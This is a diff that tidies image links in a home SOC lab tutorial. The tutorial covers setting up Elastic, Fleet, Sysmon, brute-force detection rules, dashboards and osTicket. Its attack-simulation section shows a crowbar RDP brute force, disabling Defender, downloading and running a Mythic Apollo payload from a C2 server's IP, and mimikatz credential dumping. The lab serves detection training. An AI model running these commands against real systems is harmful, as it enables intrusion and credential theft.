@@ -77,10 +77,10 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
 ### **Installing Elasticsearch**  
 
 1. **Download the Elasticsearch Package:**  
-   - Visit [Elastic’s download page](https://www.elastic.co/downloads/elasticsearch).  
+   - Visit [Elastic’s download page](https://www.elastic.co/downloads/elasticsearch). 
    - Copy the link for the `deb` x86_64 package.
 
-![Elastic](Screenshots/ElasticDownload.png).
+![Elastic](Screenshots/ElasticDownload.png)
 
    - Download it using `wget`:  
      ```bash
@@ -95,7 +95,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
 3. **Save the Security Auto-Configuration Information:**  
    - During installation, a superuser password is displayed. Save this in your password manager.
 
-![SecurityInfo](Screenshots/Elasticpowershellinstall.png).
+![SecurityInfo](Screenshots/Elasticpowershellinstall.png)
 
 4. **Modify the Configuration File:**  
    - Navigate to this directory:  
@@ -113,7 +113,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
      ```
    - Save and exit.
 
-![ElasticIP](Screenshots/ElasticsearchIPport.png).
+![ElasticIP](Screenshots/ElasticsearchIPport.png)
 
 5. **Start the Elasticsearch Service:**  
    ```bash
@@ -158,7 +158,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
    sudo systemctl status kibana.service
    ```
 
-![KibanaStatus](Screenshots/Kibanainstall3.png).
+![KibanaStatus](Screenshots/Kibanainstall3.png)
 
 5. **Generate the Enrollment Token:**  
    - Navigate to Elasticsearch’s binaries directory:  
@@ -171,7 +171,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
      ```
    - Copy the token created for use during Kibana setup.
 
-![Kibanatoken1](Screenshots/kibanatoken1.png).
+![Kibanatoken1](Screenshots/kibanatoken1.png)
 
 ### **Access Kibana**  
 
@@ -189,7 +189,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
      ```
    - Enter the enrollment token and follow the setup prompts.
 
-![kibanatoken](Screenshots/Kibanatoken.png).
+![kibanatoken](Screenshots/Kibanatoken.png)
 
 ### Retrieve and Enter Kibana Verification Code
 
@@ -211,7 +211,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
    ./kibana-verification-code
    ```
 
-![kibanacode](Screenshots/kibanaverificationcode2.png).
+![kibanacode](Screenshots/kibanaverificationcode2.png)
 
 4. **Enter the Code in Kibana GUI**:
    Go to the Kibana GUI in your web browser, and paste the verification code when prompted.
@@ -227,9 +227,9 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
 1. **Access Security Alerts**:
    In the Kibana GUI, click the hamburger menu (three horizontal lines) in the top left corner. Scroll down to the Security tab and click on "Alerts". You might see an error message saying "Failed to retrieve detection engine privileges".
 
-![ElasticLogin](Screenshots/Elasticfirstlogin.png).
+![ElasticLogin](Screenshots/Elasticfirstlogin.png)
 
-![alerterror](Screenshots/Elasticfirstloginerror.png).
+![alerterror](Screenshots/Elasticfirstloginerror.png)
 
 2. **Generate Encryption Keys**:
    Return to your SSH terminal and navigate to the Kibana binary directory again:
@@ -246,7 +246,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
    - `xpack.reporting.encryptionKey`
    - `xpack.security.encryptionKey`
 
-![keystore](Screenshots/kibanakeystore.png).
+![keystore](Screenshots/kibanakeystore.png)
 
 3. **Add Keys to Kibana Keystore**:
    Add each key to the Kibana keystore one by one:
@@ -255,7 +255,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
    ```
    Follow the prompts to enter each key. 
 
-![keystoreadd](Screenshots/kibanakeystore2.png).
+![keystoreadd](Screenshots/kibanakeystore2.png)
 
 4. **Restart Kibana Service**:
    Once all keys are added, restart the Kibana service to apply the changes:
@@ -288,9 +288,9 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
    - Click on "Add Fleet Server," choose "Quick Start," and fill in the name and public address of the fleet server you just created.
    - Click on "Generate Fleet Server Policy."
 
-![fleetserver](Screenshots/Fleetserverinstall.png).
+![fleetserver](Screenshots/Fleetserverinstall.png)
 
-![fleetserver2](Screenshots/Fleetserverinstall2.png).
+![fleetserver2](Screenshots/Fleetserverinstall2.png)
 
 3. **SSH into the Fleet Server**:
    - Connect to the fleet server using SSH and run the following command to update the server:
@@ -319,7 +319,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
        --fleet-server-port=8220
      ```
 
-![fleetservercommand](Screenshots/Fleetserverinstall3.png).
+![fleetservercommand](Screenshots/Fleetserverinstall3.png)
 
 
 ## Windows Server Elastic Agent Configuration
@@ -334,7 +334,7 @@ Cloud platforms like Azure, AWS, GCP, Vultr and DigitalOcean offer scalability a
 2. **Copy PowerShell Command**:
    - Copy the provided PowerShell command for the agent installation.
 
-![Winagent](Screenshots/addWindowsAgent.png).
+![Winagent](Screenshots/addWindowsAgent.png)
 
 ### Pre-Deployment Steps
 
@@ -351,14 +351,14 @@ Before running the enrollment command on the target Windows server, perform the 
    - Change the port in the copied PowerShell command from 443 to 8220.
    - Add the `--insecure` flag at the end of the command since a certificate hasn't been set up.
 
-![winagentpower](Screenshots/addWindowsAgent2.png).
+![winagentpower](Screenshots/addWindowsAgent2.png)
 
 3. **Adjust Fleet Settings in Kibana**:
    - In Kibana, click the hamburger menu, scroll down to the Fleet management tab, and adjust the settings to use port 8220 instead of 443.
 
-![fleetsettings](Screenshots/Fleetserverinstall4settings.png).
+![fleetsettings](Screenshots/Fleetserverinstall4settings.png)
 
-![Fleetports](Screenshots/Fleetserverinstall5settingsport.png).
+![Fleetports](Screenshots/Fleetserverinstall5settingsport.png)
 
 ### Run the Enrollment Command
 
@@ -376,7 +376,7 @@ Before running the enrollment command on the target Windows server, perform the 
    - Navigate to the Agents section under the Fleet management tab.
    - Verify that the "Target Win Server" is listed as an enrolled agent.
 
-![winservadded](Screenshots/addWindowsAgent4.png).
+![winservadded](Screenshots/addWindowsAgent4.png)
 
 ## Install and Configure Sysmon on Target Windows Server
 
@@ -389,7 +389,7 @@ Before running the enrollment command on the target Windows server, perform the 
      .\Sysmon.exe -i sysmonconfig.xml
      ```
 
-![sysmon](Screenshots/addWindowsAgent5.png).
+![sysmon](Screenshots/addWindowsAgent5.png)
 
 
 ## Set Up Integrations in Elastic
@@ -403,11 +403,11 @@ To specify what telemetry data we want to send to Elasticsearch via our Elastic 
    - For the channel name, use `Microsoft-Windows-Sysmon/Operational`, which can be found by navigating through Event Viewer on your Target Windows Server.
    - Leave the other settings as default, scroll down and click on **existing hosts**, choose the policy name you just created, and then click on **Save and Continue**.
 
-![sysmonintegration](Screenshots/integrationsysmon.png).
+![sysmonintegration](Screenshots/integrationsysmon.png)
 
-![sysmonevent](Screenshots/integrationsysmon2.png).
+![sysmonevent](Screenshots/integrationsysmon2.png)
 
-![sysmonintegration2](Screenshots/integrationsysmon3.png).
+![sysmonintegration2](Screenshots/integrationsysmon3.png)
 
 2. **Configure Windows Defender Integration**:
    - Repeat similar steps for setting up an integration for Windows Defender.
@@ -418,9 +418,9 @@ To specify what telemetry data we want to send to Elasticsearch via our Elastic 
      - Event ID 5001: Real-time protection disabled.
    - Add these Event IDs during integration setup and save it under existing hosts with your policy name.
 
-![Defenderintegration](Screenshots/integrationdefender.png).
+![Defenderintegration](Screenshots/integrationdefender.png)
 
-![bothintegrations](Screenshots/integrationbothpolicies.png).
+![bothintegrations](Screenshots/integrationbothpolicies.png)
 
 
 ## Deploying the Target Ubuntu Server (SSH Server)
@@ -455,14 +455,14 @@ Now, let's install the Elastic Agent on this new target SSH server VM.
      sudo ./elastic-agent install --url=https://<FLEET_SERVER_PUBLIC_IP>:8220 --enrollment-token=<ENROLLMENT_TOKEN> --insecure
      ```
 
-![addsshagent](Screenshots/addlinuxagent.png).
+![addsshagent](Screenshots/addlinuxagent.png)
 
 ### Verify Installation
 
 1. **Verify Agent Installation**:
    - Return to Kibana, navigate to the Agents section, and verify that the SSH server (your target Ubuntu server) is listed.
 
-![bothagentsinstalled](Screenshots/addbothagents.png).
+![bothagentsinstalled](Screenshots/addbothagents.png)
 
 
 ## Creating an SSH Brute Force Detection Rule Alert  
@@ -480,7 +480,7 @@ We will set up a detection rule in Kibana to alert us for SSH brute force attemp
      ```
      This will display all SSH-related log events, including successful and failed logins.  
 
-![sshquery1](Screenshots/querySSH.png).
+![sshquery1](Screenshots/querySSH.png)
 
 2. **Add Useful Fields to the Table**:
    - Add the following fields to the columns for better visibility by clicking the `+` icon next to each field from the left hand side of your screen:
@@ -492,7 +492,7 @@ We will set up a detection rule in Kibana to alert us for SSH brute force attemp
 3. **Filter for Failed Attempts**:
    - Hover over the `system.auth.ssh.event` field, find the value for failed attempts (e.g., `"Failed"`), and click the `+` icon to filter only those events.  
 
-![failedssh](Screenshots/querySSH2.png).
+![failedssh](Screenshots/querySSH2.png)
 
 4. **Save the Query**:
    - At the top-right corner of the page, click on **Save Query**.  
@@ -509,7 +509,7 @@ We will set up a detection rule in Kibana to alert us for SSH brute force attemp
 2. **Choose a Rule Type**:
    - Select **Threshold**.  
 
-![SSHrule](Screenshots/RuleSSH.png).
+![SSHrule](Screenshots/RuleSSH.png)
 
 3. **Define the Query**:
    - Scroll down and paste the following query:  
@@ -527,12 +527,12 @@ We will set up a detection rule in Kibana to alert us for SSH brute force attemp
      - Run every 5 minutes.  
      - Look back at the last 5 minutes of logs.  
 
-![SSHrule2](Screenshots/RuleSSH2.png).
+![SSHrule2](Screenshots/RuleSSH2.png)
 
 5. **Enable the Rule**:
    - Leave the default actions and click **Create & Enable Rule**.  
 
-![SSHrule3](Screenshots/RuleSSH3.png).
+![SSHrule3](Screenshots/RuleSSH3.png)
 
 
 ## Creating a Dashboard for SSH Activity
@@ -553,33 +553,33 @@ In this section, we will create a dashboard in Kibana to visualize SSH activity.
      ```
    - Press **Enter** to execute the query.
 
-![map](Screenshots/map.png).
+![map](Screenshots/map.png)
 
 2. **Add a Layer**:
    - Click on **Add layer**.
    - Choose **Choropleth** from the options.
 
-![maplayer](Screenshots/map2.png).
+![maplayer](Screenshots/map2.png)
 
 3. **Select Data View**:
    - From the **EMS Boundaries** dropdown, select **World Countries**.
    - For the data view, select your relevant data source.
    - In the join field dropdown menu, choose `source.geo.country_iso_code`.
 
-![maplayer2](Screenshots/map3.png).
+![maplayer2](Screenshots/map3.png)
 
 4. **Finalize Layer Settings**:
    - Click on **Add and continue**, leaving all settings as default.
    - Click on **Save** at the top-right corner of the screen.
 
-![mapsave](Screenshots/mapsave.png).
+![mapsave](Screenshots/mapsave.png)
 
 ### Name the Map
 
    **Provide a Title**:
    - Enter a title like **Failed SSH Logon Attempts** and click on **Save**.
 
-![Mapname](Screenshots/map4.png).
+![Mapname](Screenshots/map4.png)
 
 ### Step 4: Duplicate for Successful SSH Attempts
 
@@ -591,11 +591,11 @@ In this section, we will create a dashboard in Kibana to visualize SSH activity.
      ```
    - Update the title to **Successful SSH Logon Attempts** and click on **Save**.
 
-![mapduplicate](Screenshots/map5.png).
+![mapduplicate](Screenshots/map5.png)
 
-![mapsucessful](Screenshots/map6.png).
+![mapsucessful](Screenshots/map6.png)
 
-![mapfailandsuccessSSH](Screenshots/map7.png).
+![mapfailandsuccessSSH](Screenshots/map7.png)
 
 
 ## Creating an RDP Brute Force Alert
@@ -653,7 +653,7 @@ This query will display all failed logon attempts by the `administrator` user on
 5. **Enable the Rule**:
    - Leave the default actions and click **Create & Enable Rule**.
 
-![bothrules](Screenshots/RuleSSH-RDP.png).
+![bothrules](Screenshots/RuleSSH-RDP.png)
 
 
 ## Adding RDP Activity to the Dashboard
@@ -700,7 +700,7 @@ This query will display all failed logon attempts by the `administrator` user on
      ```
    - Update the title to **Successful RDP Logon Attempts** and click on **Save**.
 
-![4maps](Screenshots/Kibanadashboardall4maps.png).
+![4maps](Screenshots/Kibanadashboardall4maps.png)
 
 
 ## Enhancing the Dashboard with More Visualizations
@@ -727,7 +727,7 @@ Now that we have all four maps in our dashboard, let's add more details by creat
 4. **Change Visualization Type**:
    - Change the visualization type from the default **Bar** to **Table**.
 
-![Tables](Screenshots/DashboardTables.png).
+![Tables](Screenshots/DashboardTables.png)
 
 5. **Configure Each Field**:
    - Click on each field from the right side of your screen to configure it:
@@ -735,12 +735,12 @@ Now that we have all four maps in our dashboard, let's add more details by creat
      - Click on **Advanced** and uncheck the option for **Group remaining values as "other"**.
    - Repeat this configuration for the other fields.
 
-![tables2](Screenshots/DashboardTables2.png).
+![tables2](Screenshots/DashboardTables2.png)
 
 6. **Sort Records**:
    - Click on the three little dots in the count of records column and select **Sort Descending**.
 
-![tablessort](Screenshots/DashboardTables33.png).
+![tablessort](Screenshots/DashboardTables33.png)
 
 7. **Save the Table**:
    - Once configured, click on **Save** at the top right of the screen.
@@ -781,7 +781,7 @@ Now that we have all four maps in our dashboard, let's add more details by creat
 
 Now, you have a dashboard with clear visualizations that allow you to quickly see, at a glance, failed and successful RDP and SSH logins, along with tables displaying the IP addresses and countries from which they originated.
 
-![tablesfinal](Screenshots/DashboardTables4.png).
+![tablesfinal](Screenshots/DashboardTables4.png)
 
 
 ## Setting Up Mythic C2 (Command & Control)
@@ -790,7 +790,7 @@ In this section, we will set up Mythic C2, a Command and Control framework that 
 
 ### Diagram Overview
 
-![Mythicdiagram](Screenshots/MythicDiagram.png).
+![Mythicdiagram](Screenshots/MythicDiagram.png)
 
 ### Phases of the C2 Setup
 
@@ -900,16 +900,16 @@ apt-get update && apt-get upgrade -y
      cat .env # To view username and password
      ```
 
-![lsenv](Screenshots/Mythicpasswordcat.png).
+![lsenv](Screenshots/Mythicpasswordcat.png)
 
-![catenv](Screenshots/Mythicpassword.png).
+![catenv](Screenshots/Mythicpassword.png)
 
 3. **Sign In**:
    - Use the retrieved credentials to sign into the Mythic web portal.
 
-![mythicpassword](Screenshots/MythicSigninafterpassword.png).
+![mythicpassword](Screenshots/MythicSigninafterpassword.png)
 
-![mythiclandingpage](Screenshots/MythicSigninafterpassword2.png).
+![mythiclandingpage](Screenshots/MythicSigninafterpassword2.png)
 
 Mythic C2 is now set up and ready for use.
 
@@ -922,7 +922,7 @@ Navigate to the Administrator user and create a folder named `TopSecret`. Create
 C:\Users\Administrator\TopSecret
 ```
 
-![fakepassword](Screenshots/Winserverfakepassword.png).
+![fakepassword](Screenshots/Winserverfakepassword.png)
 
 ### 2. Setting the Administrator Password:
 Set the Administrator user password on the target Windows server to `S3cr3tp@s5w0rd`.
@@ -936,13 +936,13 @@ mkdir ~/Desktop/Mythic
 
 We can create a text file with 50 fake passwords and put the administrator password we just created on the last row. This way, our command will try the 50 bad passwords first and then successfully RDP brute force with the good password on the 51st try. Or, we can copy a password wordlist from Kali Linux. Let's choose one that is not too big, such as `2023-200_most_used_passwords.txt`.
 
-![Wordlist](Screenshots/KaliWordlist.png).
+![Wordlist](Screenshots/KaliWordlist.png)
 
 ```bash
 cp /usr/share/wordlists/seclists/SecLists-master/Passwords/2023-200_most_used_passwords.txt ~/Desktop/Mythic/password.txt
 ```
 
-![copywordlist](Screenshots/KaliWordlist2.png).
+![copywordlist](Screenshots/KaliWordlist2.png)
 
 This command copies the wordlist to the new directory and renames it to `password.txt`
 
@@ -977,7 +977,7 @@ crowbar -b rdp -u Administrator -C password.txt -s 199.247.5.216/32
 - `-C` is the password list.
 - `-s` is the target Windows server IP address (the `/32` targets ONLY this IP address).
 
-![adminpasswordRDP](Screenshots/KaliWordlist3.png).
+![adminpasswordRDP](Screenshots/KaliWordlist3.png)
 
 ### 5. RDP into Target Windows Server:
 Use xfreerdp to connect via RDP:
@@ -992,7 +992,7 @@ xfreerdp /u:Administrator /p:S3cr3tp@s5w0rd /v:199.247.5.216:3389
 
 ![xfreerdp(Screenshots/KaliXfreeRDP.png).
 
-![rdpconnected](Screenshots/KaliXfreeRDP2.png).
+![rdpconnected](Screenshots/KaliXfreeRDP2.png)
 
 Once connected, let's open CMD and run some discovery commands. We are doing this to simulate what attackers usually do when they gain access to a machine.
 
@@ -1006,12 +1006,12 @@ net use
 ipconfig /all
 ```
 
-![discovery](Screenshots/KaliXfreeRDP3Discover.png).
+![discovery](Screenshots/KaliXfreeRDP3Discover.png)
 
 ### 6. Disabling Windows Defender:
 Disable Windows Defender from the target server.
 
-![disabledefender](Screenshots/KaliXfreeRDP4dissableDefender.png).
+![disabledefender](Screenshots/KaliXfreeRDP4dissableDefender.png)
 
 ### 7. Building Mythic C2 Agent (Apollo):
 SSH into the Mythic Server and install the Apollo agent:
@@ -1020,9 +1020,9 @@ SSH into the Mythic Server and install the Apollo agent:
 ./mythic-cli install github https://github.com/MythicAgents/Apollo
 ```
 
-![installapolo](Screenshots/Mythiccreateagent.png).
+![installapolo](Screenshots/Mythiccreateagent.png)
 
-![apollomythic](Screenshots/Mythiccreateagent2.png).
+![apollomythic](Screenshots/Mythiccreateagent2.png)
 
 Create a C2 profile using HTTP:
 
@@ -1030,16 +1030,16 @@ Create a C2 profile using HTTP:
 ./mythic-cli install github https://github.com/MythicC2Profiles/http
 ```
 
-![c2profile](Screenshots/mythiccreateagent3.png).
+![c2profile](Screenshots/mythiccreateagent3.png)
 
-![c2profilemythic](Screenshots/Mythiccreateagent4http.png).
+![c2profilemythic](Screenshots/Mythiccreateagent4http.png)
 
 ### 8. Creating a New Payload:
 Generate a new payload from the Mythic web portal.
 
-![payload](Screenshots/mythicpayload.png).
+![payload](Screenshots/mythicpayload.png)
 
-![payload2](Screenshots/mythicpayload2.png).
+![payload2](Screenshots/mythicpayload2.png)
 
 Modify the callback host to the Mythic server's public IP address:
 
@@ -1047,17 +1047,17 @@ Modify the callback host to the Mythic server's public IP address:
 http://45.77.53.41
 ```
 
-![modifypayload](Screenshots/mythicpayload6IP.png).
+![modifypayload](Screenshots/mythicpayload6IP.png)
 
 Download the payload on the Mythic server:
 
-![downloadpayload](Screenshots/mythicpayload7download.png).
+![downloadpayload](Screenshots/mythicpayload7download.png)
 
 ```bash
 wget https://45.77.53.41:7443/direct/download/34ce1813-32d4-484f-99c3-2633a9ea7cb9 --no-check-certificate
 ```
 
-![download2](Screenshots/mythicpayload8download2.png).
+![download2](Screenshots/mythicpayload8download2.png)
 
 Since it creates a very long filename (`34ce1813-32d4-484f-99c3-2633a9ea7cb9`), let's rename it to `apollo.exe` or any name you prefer with this command:
 
@@ -1065,11 +1065,11 @@ Since it creates a very long filename (`34ce1813-32d4-484f-99c3-2633a9ea7cb9`), 
 mv 34ce1813-32d4-484f-99c3-2633a9ea7cb9 apollo.exe
 ```
 
-![changename](Screenshots/mythicpayload9changename.png).
+![changename](Screenshots/mythicpayload9changename.png)
 
 Let's create a new directory and move the `apollo.exe` file inside it.
 
-![changedirectory](Screenshots/mythicpayload99makedir.png).
+![changedirectory](Screenshots/mythicpayload99makedir.png)
 
 ### 9. Setting Up HTTP Server and Downloading Payload:
 Start an HTTP server on the Mythic server:
@@ -1078,7 +1078,7 @@ Start an HTTP server on the Mythic server:
 python3 -m http.server 9999
 ```
 
-![httpserver9999](Screenshots/mythicpayload9999port.png).
+![httpserver9999](Screenshots/mythicpayload9999port.png)
 
 Download the payload on the target Windows server:
 
@@ -1086,7 +1086,7 @@ Download the payload on the target Windows server:
 Invoke-WebRequest -Uri http://45.77.53.41:9999/Apollo/apollo.exe -OutFile "C:\Temp\apollo.exe"
 ```
 
-![invoke](Screenshots/mythicpayload.png99999Invoke.png).
+![invoke](Screenshots/mythicpayload.png99999Invoke.png)
 
 This command will look for our Mythic server on port 9999 and download `apollo.exe` into the Temp folder of the target Windows server. 
 
@@ -1097,13 +1097,13 @@ ufw allow 9999
 ufw allow 80
 ```
 
-![status200](Screenshots/mythicpayload9999status200.png).
+![status200](Screenshots/mythicpayload9999status200.png)
 
 Now we should see status 200, indicating success.
 
 We can open File Explorer and verify that `apollo.exe` has been downloaded in the Temp folder of the target Windows server.
 
-![apollotemp](Screenshots/mythicpayload9999Temp.png).
+![apollotemp](Screenshots/mythicpayload9999Temp.png)
 
 ### 10. Running the Payload and Establishing Command & Control:
 Run the payload in PowerShell:
@@ -1112,13 +1112,13 @@ Run the payload in PowerShell:
 .\apollo.exe
 ```
 
-![runapollo](Screenshots/mythicpayload9999Run.png).
+![runapollo](Screenshots/mythicpayload9999Run.png)
 
-![netstat](Screenshots/MythicPayloadEstablished.png).
+![netstat](Screenshots/MythicPayloadEstablished.png)
 
 Once we run it, we get a callback to our Mythic C2, allowing us to execute commands straight from Mythic. We can click on the telephone icon at the top ("Active callback") and then type in our commands at the bottom of the screen.
 
-![apollocallback](Screenshots/apollo3callback.png).
+![apollocallback](Screenshots/apollo3callback.png)
 
 Examples of commands we can run include:
 
@@ -1131,19 +1131,19 @@ screenshot
 mimikatz sekurlsa::logonpasswords 
 ```
 
-![command1](Screenshots/mythicpayloadcallback2.png).
+![command1](Screenshots/mythicpayloadcallback2.png)
 
-![whoami](Screenshots/mythicpayloadcallback4.png).
+![whoami](Screenshots/mythicpayloadcallback4.png)
 
-![Screenshot](Screenshots/mythicpayloadcallback3.png).
+![Screenshot](Screenshots/mythicpayloadcallback3.png)
 
-![mimikatz](Screenshots/mythicpayloadcallback.png).
+![mimikatz](Screenshots/mythicpayloadcallback.png)
 
-![mythicdownloadpassword](Screenshots/mythicapollodownload.png).
+![mythicdownloadpassword](Screenshots/mythicapollodownload.png)
 
-![mythicdownload2](Screenshots/mythicapollodownload2.png(.
+![mythicdownload2](Screenshots/mythicapollodownload2.png)
 
-![mythicdownloadother](Screenshots/mythicapollodownload3.png).
+![mythicdownloadother](Screenshots/mythicapollodownload3.png)
 
 
 ## Creating Detection and Alert Rules in ELK for the Mythic C2 Apollo Agent
@@ -1158,11 +1158,11 @@ In this section, we will create a detection and alert rule for the Mythic C2 Apo
 2. **Maximize a Process Creation Event**  
    Locate a log entry corresponding to a process creation event (Sysmon Event 1) and maximize it to view its details.
 
-![queryc2](Screenshots/RuleC2.png).
+![queryc2](Screenshots/RuleC2.png)
 
-![queryc23](Screenshots/RuleC23.png).
+![queryc23](Screenshots/RuleC23.png)
 
-![queryc24](Screenshots/RuleC24.png).
+![queryc24](Screenshots/RuleC24.png)
 
 3. **Refine Your Search Query**  
    To narrow down your search, include additional parameters such as the SHA256 hash and the original file name. Use the following query:
@@ -1188,7 +1188,7 @@ In this section, we will create a detection and alert rule for the Mythic C2 Apo
    - winlog.event_data.CurrentDirectory
    - event.provider
 
-![Queryc26](Screenshots/RuleC25.png).
+![Queryc26](Screenshots/RuleC25.png)
 
 5. **Create a New Detection Rule**  
    Navigate to the `Security` tab, click on `Rules`, then select `Detection rules (SIEM)`, and click on `+ Create new rule`. Choose `Custom query`.
@@ -1200,7 +1200,7 @@ In this section, we will create a detection and alert rule for the Mythic C2 Apo
    event.code: "1" and (winlog.event_data.OriginalFileName: "Apollo.exe" or winlog.event_data.Hashes: "SHA256=53FA7B788EE8C7F863A1237CF6B80C5ED8274A0AF433E5EFE430AE1ABCD1A793")
    ```
 
-![c2rule](Screenshots/RuleC26.png).
+![c2rule](Screenshots/RuleC26.png)
 
 7. **Add Required Fields**  
    Click on `Required fields` and add all relevant fields you previously selected. Then click on `Continue`.
@@ -1211,7 +1211,7 @@ In this section, we will create a detection and alert rule for the Mythic C2 Apo
 9. **Schedule the Rule**  
    Set the rule to run every 5 minutes with a lookback period of 5 minutes, then create and enable the rule.
 
-![c2rulefinish](Screenshots/RuleC27.png).
+![c2rulefinish](Screenshots/RuleC27.png)
 
 ### Creating a Dashboard with 3 Tables
 
@@ -1226,7 +1226,7 @@ We will create three tables in our dashboard to monitor specific events:
 1. **Event ID 1 - Process Creation**  
    Start by searching for Sysmon Event ID 1:
 
-![eventprovider](Screenshots/eventprovidersysmon.png).
+![eventprovider](Screenshots/eventprovidersysmon.png)
 
 2. **Maximize a Log for Relevant Fields**  
    Maximize one of the documents to identify relevant fields to include in your table.
@@ -1267,9 +1267,9 @@ With our 3 queries ready, we can now proceed to create our tables in dashboard.
     
     - Drag relevant fields from the left panel into the middle area of the screen.
 
-![tablec2](Screenshots/Tablesc2.png).
+![tablec2](Screenshots/Tablesc2.png)
 
-![tablec23](Screenshots/Tablesc24.png).
+![tablec23](Screenshots/Tablesc24.png)
 
 6. **Format Each Table**  
    
@@ -1281,13 +1281,13 @@ With our 3 queries ready, we can now proceed to create our tables in dashboard.
     
     - Rename field names for clarity (e.g., change “Top 999 values of host.hostname” to “hostnames”).
 
-![modifytables](Screenshots/Tablesc22.png).
+![modifytables](Screenshots/Tablesc22.png)
 
 7. **Save Each Visualization**  
    
     - After configuring each table, click on `Save`.
 
-![tablefinalc2](Screenshots/Tablesc2final.png).
+![tablefinalc2](Screenshots/Tablesc2final.png)
 
 We now have our alerts set up for detecting suspicious activities related to the Mythic C2 Apollo agent and a dashboard with tables providing clear visibility into critical security events.
 
@@ -1318,7 +1318,7 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
    - Open the XAMPP Control Panel.
    - Start both **Apache** and **MySQL** services.
 
-![xamppwizard](Screenshots/Xamppwizard.png).
+![xamppwizard](Screenshots/Xamppwizard.png)
 
 3. **Access phpMyAdmin**:
    - Click on "Start" in the XAMPP Control Pannel for `Apache` and `MySQL`.
@@ -1327,7 +1327,7 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
 
 ![adminportal](Screenshots/Xamp7.png)
 
-![php](Screenshots/Xamp8.png).
+![php](Screenshots/Xamp8.png)
 
 ### Configuring phpMyAdmin
 
@@ -1338,15 +1338,15 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
    - Set a password and click on `Go`.
    - Repeat this process for the `pma` user.
 
-![phpconfig](Screenshots/Xamp9.png).
+![phpconfig](Screenshots/Xamp9.png)
 
-![phpuserconfig](Screenshots/Xamp99.png).
+![phpuserconfig](Screenshots/Xamp99.png)
 
-![phplogin](Screenshots/Xamp999.png).
+![phplogin](Screenshots/Xamp999.png)
 
-![userinfo](Screenshots/Xamp9999.png).
+![userinfo](Screenshots/Xamp9999.png)
 
-![userend](Screenshots/Xamp99999.png).
+![userend](Screenshots/Xamp99999.png)
 
 ### Configuring Configuration Files
 
@@ -1354,17 +1354,17 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
    - Navigate to `C:\xampp`, right-click on properties, and edit.
    - Change `apache_domainname=` to your public IP address of the osTicket Windows server and save.
 
-![properties](Screenshots/Xamp2.png).
+![properties](Screenshots/Xamp2.png)
 
-![properties2](Screenshots/Xamp3.png).
+![properties2](Screenshots/Xamp3.png)
 
 2. **Edit phpMyAdmin Configuration**:
    - Go to `C:\xampp\phpMyAdmin` and edit `config.inc.php`.
    - Update the server's host IP with your public IP address and change passwords accordingly.
 
-![config](Screenshots/Xamp4.png).
+![config](Screenshots/Xamp4.png)
 
-![config2](Screenshots/Xamp5.png).
+![config2](Screenshots/Xamp5.png)
 
 ### Firewall Configuration
 
@@ -1376,7 +1376,7 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
      - Input `80, 443` and click Next.
      - Select "Allow the connection" and complete the wizard with a name like "Inbound 80, 443".
 
-![firewall](Screenshots/Windowsserverfirewall2.png).
+![firewall](Screenshots/Windowsserverfirewall2.png)
 
 ### Creating a Database in phpMyAdmin
 
@@ -1384,19 +1384,19 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
 
 2. Click on "New" at the top left of the screen.
 
-![newDB](Screenshots/osticketconfig5.png).
+![newDB](Screenshots/osticketconfig5.png)
 
 3. Enter a name for your database and click "Create".
 
-![databaase](Screenshots/osticketconfig6.png).
+![databaase](Screenshots/osticketconfig6.png)
 
-![database2](Screenshots/osticketconfig7.png).
+![database2](Screenshots/osticketconfig7.png)
 
 ### Installing osTicket
 
 1. **Download osTicket**: Visit [osTicket](https://osticket.com/) and download osTicket on your Windows server.
 
-![osticketdownload](Screenshots/osticketdownlload.png).
+![osticketdownload](Screenshots/osticketdownlload.png)
 
 2. **Extract Files**: Extract the downloaded files.
 
@@ -1404,25 +1404,25 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
    - Navigate to `C:\xampp\htdocs` and create a new folder named `osticket`.
    - Copy both folders "scripts" and "upload" into this new folder.
 
-![copyfiles](Screenshots/osticketconfig.png).
+![copyfiles](Screenshots/osticketconfig.png)
 
 4. **Run osTicket Setup**:
    - In your web browser, navigate to `<osticket_windows_server_IP_address>/osticket/upload/setup`.
    - Follow prompts until you encounter "Configuration file missing". Rename `include/ost-sampleconfig.php` to `ost-config.php`.
    - Change directory to `C:\xampp\htdocs\osticket\upload\include` and rename the `ost-sampleconfig.php` file to `ost-config.php`.
 
-![osticketwebportal](Screenshots/osticketconfig2.png).
+![osticketwebportal](Screenshots/osticketconfig2.png)
 
-![missingfiles](Screenshots/osticketconfig3.png).
+![missingfiles](Screenshots/osticketconfig3.png)
 
-![changename](Screenshots/osticketconfig4.png).
+![changename](Screenshots/osticketconfig4.png)
 
 5. Complete the Basic Installation:
    - Fill out all required fields (name, email, username, password).
    - For database settings, enter your public IP address of the osTicket Windows server along with database name, username, and password created in phpMyAdmin.
    - Click on "Install Now".
 
-![install](Screenshots/osticketconfig8.png).
+![install](Screenshots/osticketconfig8.png)
 
 6. **File Permissions via PowerShell**:
    - Open an admin PowerShell terminal.
@@ -1432,7 +1432,7 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
      icacls ost-config.php /reset
      ```
 
-![powershell](Screenshots/osticketconfig99.png).
+![powershell](Screenshots/osticketconfig99.png)
 
 7. **Access URLs**:
    Copy these URLs for future access:
